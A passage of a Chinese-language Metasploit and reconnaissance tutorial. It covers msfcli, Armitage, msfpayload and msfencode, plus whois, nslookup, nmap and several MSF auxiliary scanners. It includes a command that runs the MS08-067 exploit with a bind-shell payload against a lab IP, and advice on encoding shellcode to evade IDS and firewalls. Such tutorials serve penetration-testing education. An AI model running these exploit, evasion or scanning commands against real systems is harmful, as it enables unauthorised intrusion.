24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfcli">msfcli<a class="hash-link" href="#msfcli" title="标题的直接链接">​</a></h3><p>3、msfcli 和msfconsole相比不提供交互方式，它直接从命令行输入所有参数并产生结果，</p><p>msfcli –h #获取帮助信息</p><p>msfcli &lt;exploit_name&gt; &lt;option=value&gt; <!-- -->[mode]</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mode:H（help）帮助</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   S（summary）显示模块信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    O（options）显示模块的可用选项</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     A（advanced）显示高级选项   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">I（ids）显示IDS EVASION 选项</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     P（payload）显示此模块可用的payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">T（targets）显示可用targets</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AC（action）显示可用actions</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C（check）运行模块测试</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   E（execute）执行选定的模块</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="模块使用示例">模块使用示例<a class="hash-link" href="#模块使用示例" title="标题的直接链接">​</a></h3><p>例子：ms08_067_netapi模块</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfcli windows/smb/ms08_067_netapi O    #查看可用选项</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.111 P #查看可用payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.111 PAYLOAD=windows/shell/bind_tcp E   #执行 （此处O、P 等参数也可以用小写）</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="armitage使用">armitage使用<a class="hash-link" href="#armitage使用" title="标题的直接链接">​</a></h3><p>4、Armitage :MSF的一个图形接口</p><p>运行方式：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /opt/farmework/msf3/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">armitage</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="msf其他组件">msf其他组件<a class="hash-link" href="#msf其他组件" title="标题的直接链接">​</a></h3><p>5、MSF其他组件：</p><ul><li>MSFpayload工具：</li></ul><p>用于生成shellcode，可生成C,Ruby，JaveScript，VB格式的shellcode。
帮助信息：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload –h</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ul><li>MSFencode工具：</li></ul><p>编码压缩shellcode，过IDS ,防火墙。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfencode -h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfencode –l 查看可用的编码器（encoders），效果最佳的是x86/shikata_ga_nai</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="三信息刺探与收集">三．信息刺探与收集<a class="hash-link" href="#三信息刺探与收集" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1攻击第一步基础信息收集">1、攻击第一步：基础信息收集<a class="hash-link" href="#1攻击第一步基础信息收集" title="标题的直接链接">​</a></h3><p>whois查询：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf &gt; whois example.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; whois 192.168.1.100</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><a href="http://searchdns.netcraft.com/%E5%9C%A8%E7%BA%BF%E6%94%B6%E9%9B%86%E6%9C%8D%E5%8A%A1%E5%99%A8IP%E4%BF%A1%E6%81%AF%E5%B7%A5%E5%85%B7" target="_blank" rel="noopener noreferrer">http://searchdns.netcraft.com/在线收集服务器IP信息工具</a></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nslookup</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set type=mx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; example.com</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2用nmap探测开放端口和服务">2、用nmap探测开放端口和服务：<a class="hash-link" href="#2用nmap探测开放端口和服务" title="标题的直接链接">​</a></h3><p>-sS SYN半开扫描  -sT TCP 半开扫描 -Pn 不使用ping 方式探测主机  -A 探测服务类型 -6 开启IPV6扫描  -O 探测操作系统版本
常用扫描参数组合：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nmap –sS –Pn 192.168.0.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap –sS –Pn –A 192.168.0.111 </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>其他组合：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nmap -T4 -A -v 深入式扫描</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sS -sU -T4 -A -v 同上，且扫UDP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -p 1-65535 -T4 -A -v  扫描所有TCP端口</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -T4 -A -v -Pn 不使用ping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sn 使用ping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -T4 -F 快速扫描</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sV -T4 -O -F --version-light 加强版快速扫描</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sn --traceroute 快速路由跟踪扫描</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" 慢速全面扫描</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>（nmap的scripts位于/usr/local/share/nmap/scripts/目录，用LUA语言编写，nmap --script-help all | less 查看脚本扫描帮助信息）
（nmap还有一个GUI界面工具叫zenmap，命令zenmap或nmapfe都可以启动）</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="3msf与postgresql协同工作">3、MSF与postgresql协同工作<a class="hash-link" href="#3msf与postgresql协同工作" title="标题的直接链接">​</a></h3><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/etc/init.d/postgreql-8.3 start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_status</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 导入nmap扫描的结果：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap –sS –Pn –A –oX Subnet1 192.168.1.0/24   # -oX 扫描结果导出为Subnet1.xml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_import Subnet1.xml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_hosts –c address   #查看导入的主机IP </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>msf也可以和mysql一起工作，在bt5 r1中msf默认支持连接mysql：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_driver mysql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_connect root:toor@127.0.0.1/msf3 #连接本机mysql的msf3数据库</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysql默认密码toor，使用db_connect连接时会自动创建msf3库）</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="4高级扫描方式">4、高级扫描方式：<a class="hash-link" href="#4高级扫描方式" title="标题的直接链接">​</a></h3><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/ip/ipidseq   #IPID序列扫描器，与nmap的-sI -O选项类似</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RPORT 8080</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>（RHOSTS、RPORT等参数也可以用小写）</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; nmap –PN –sI 192.168.1.09 192.168.1.155</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>nmap 连接数据库：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_nmap –sS –A 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_services  #查看扫描结果</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>使用portscan模块：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; search postscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use scanner/postscan/syn</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="5特定扫描">5、特定扫描：<a class="hash-link" href="#5特定扫描" title="标题的直接链接">​</a></h3><p>smb_version模块：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/smb/smb_version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address,os_flavor</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>查找mssql主机：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/mssql/mssql_ping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 255</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>SSH服务器扫描：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/ssh/ssh_version </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>FTP主机扫描：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/ftp/ftp_version </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 255</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>扫描FTP匿名登录：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use auxiliary/scanner/ftp/anonymos</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token 